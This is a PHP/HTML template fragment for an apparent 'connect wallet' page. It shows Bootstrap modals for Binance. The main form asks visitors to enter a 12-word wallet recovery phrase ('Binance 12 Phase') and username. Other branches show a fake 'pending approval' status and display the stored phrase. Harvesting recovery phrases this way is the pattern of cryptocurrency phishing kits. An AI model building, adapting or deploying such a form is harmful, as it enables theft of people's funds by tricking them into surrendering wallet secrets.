<?php if ($b_wallet_status == 'b_3' && !isset($_GET['success_add_binance'])) { ?>

    <div class="modal fade" id="binance">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Binance</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="input">Binance 12 Phase</label>
                            <input type="text" class="form-control" name="wallet_phase"
                                   placeholder="Enter Wallet Phase">
                        </div>
                        <div class="form-group">
                            <label for="input2">Binance Username</label>
                            <input type="text" class="form-control" name="wallet_username"
                                   placeholder="Binance UserName">
                        </div>
                        <button type="submit" class="btn btn-primary" name="update_binance">Submit</button>
                    </form>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php }elseif (isset($_GET['success_add_binance']) && $b_wallet_status == '2')  { ?>
    <div class="modal fade" id="binance">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Binance</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <span class="text-success">Wallet Updated Successfully </span>: Pending Approval
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Trigger click event on element with id "metaMask"
            var metaMaskElement = document.getElementById('trigBinance');
            if (metaMaskElement) {
                metaMaskElement.click();
            }
        });
    </script>
<?php }elseif ($_SERVER['REQUEST_URI'] == '/connect_wallet/' && $b_wallet_status == 2) { ?>
    <div class="modal fade" id="binance">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Binance</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <span class="text-success">Your wallet have been submitted successfully </span>: and is pending approval
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } elseif ($b_wallet_status == 1) { ?>
    <!-- The Modal -->
    <div class="modal fade" id="binance">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <?php
                if ($b_wallet_status == 1){
                    $b_wallet_status = 'connected';
                }elseif($b_wallet_status == 2){
                    $b_wallet_status = 'pending approval';
                }elseif($b_wallet_status == b_3){
                    $b_wallet_status = 'not connected';
                }
                ?>
                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Binance<span
                            class="p-2 text-success bg-dark"><?= $b_wallet_status?></span></h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <div class="p-3 border-1">Your wallet phase</div>
                    <div class="p-3 border-1"><?= $b_d_wallet_phase  ?></div>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } ?>
